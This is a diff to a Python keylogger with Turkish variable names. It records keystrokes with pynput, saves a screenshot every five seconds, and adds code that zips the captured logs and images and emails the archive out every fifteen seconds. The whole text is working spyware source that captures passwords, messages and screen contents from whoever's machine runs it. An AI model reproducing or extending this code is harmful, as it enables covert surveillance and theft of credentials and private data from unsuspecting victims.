@@ -6,10 +6,13 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import zipfile
+import os
 
+log = open("Logs\\log.txt", "w")
 
-log = open("Logs\\logs.txt", "w")
-counter = 1
+image_counter = 1
+zip_counter = 1
 
 def callback_function(key):
     try:
@@ -92,17 +95,33 @@ def send_email(message):
         print("E-posta gönderme hatası:", str(e))
 
 def thread_function():
-    send_email("Rar Files\\deneme.rar")
+    global zip_counter
+    folders=["Images","Logs"]
+    zip_name=f"Rar Files\\Log{zip_counter}.zip"
+    zip_counter +=1
+    convert_zip(folders,zip_name)
+    send_email(zip_name)
     timer_object = threading.Timer(15,thread_function)
     timer_object.start()
 
 def take_screenshot():
-    global counter
+    global image_counter
     ekran=pyautogui.screenshot()
-    ekran.save(f"Images\\ekran{counter}.jpg")
-    counter += 1
+    ekran.save(f"Images\\ekran{image_counter}.jpg")
+    image_counter += 1
     timer_object = threading.Timer(5,take_screenshot)
     timer_object.start()
+
+    
+def convert_zip(kaynak_dosyalar, hedef_zip):
+    with zipfile.ZipFile(hedef_zip, 'w', zipfile.ZIP_DEFLATED) as zipdosyasi:
+        for kaynak_dosya in kaynak_dosyalar:
+            for root, dirs, files in os.walk(kaynak_dosya):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zip_path = os.path.relpath(file_path, kaynak_dosya)
+                    zipdosyasi.write(file_path, zip_path)
+
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 with keylogger_listener:
@@ -113,6 +132,4 @@ with keylogger_listener:
 
 log.close()
     
-
-
 
